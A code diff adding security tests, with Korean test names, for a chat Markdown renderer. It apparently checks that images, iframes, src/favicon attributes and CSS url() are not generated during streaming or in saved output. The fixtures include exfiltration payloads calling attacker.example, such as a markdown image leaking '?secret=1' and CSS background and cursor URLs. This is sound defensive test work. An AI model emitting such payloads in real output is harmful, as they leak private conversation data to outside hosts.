@@ -106,3 +106,34 @@ describe('공통 채팅 Markdown 렌더러의 보안 경계', () => {
     expect(html).toContain('example.com')
   })
 })
+
+const networkPayloads = [
+  '![private context](https://attacker.example/leak?secret=1)',
+  '<img src="http://127.0.0.1/private">',
+  ':img{src="https://attacker.example/leak"}',
+  '<div style="background-image:url(https://attacker.example/css)">text</div>',
+  ':span{style="cursor:url(https://attacker.example/cursor),auto"}',
+  ':source-link{url="https://example.com" favicon="https://attacker.example/favicon" label="source"}'
+]
+
+test.each(networkPayloads)('완료·스트리밍·저장된 Markdown은 자동 요청 속성을 만들지 않는다: %s', async (payload) => {
+  for (const streaming of [false, true]) {
+    const html = await render(JSON.parse(JSON.stringify(payload)), streaming)
+    expect(html).not.toMatch(/<(?:img|iframe|video|audio|source|link)(?:\s|>)/i)
+    expect(html).not.toMatch(/\s(?:src|srcset|favicon)=/i)
+    expect(html).not.toMatch(/style="[^"]*(?:url|image-set)\s*\(/i)
+  }
+})
+
+test('완료된 코드 블록을 재사용하는 스트리밍에서도 강조 색과 이미지의 클릭 링크를 유지한다', async () => {
+  const parse = createMarkdownParser(chatMarkdownOptions)
+  for (const suffix of ['', '\n\nnext', '\n\nnext paragraph']) {
+    const document = await parse('```python\n# comment\nprint("safe")\n```\n\n![picture](https://example.com/a.png)' + suffix, { streaming: true })
+    const html = await renderToString(createSSRApp(MarkdownDocument, { value: document }))
+    expect(html).toContain('<span style=')
+    expect(html).toContain('--shiki-dark-font-style:italic')
+    expect(html).toContain('href="https://example.com/a.png"')
+    expect(html).toContain('picture')
+    expect(html).not.toContain('<img')
+  }
+})
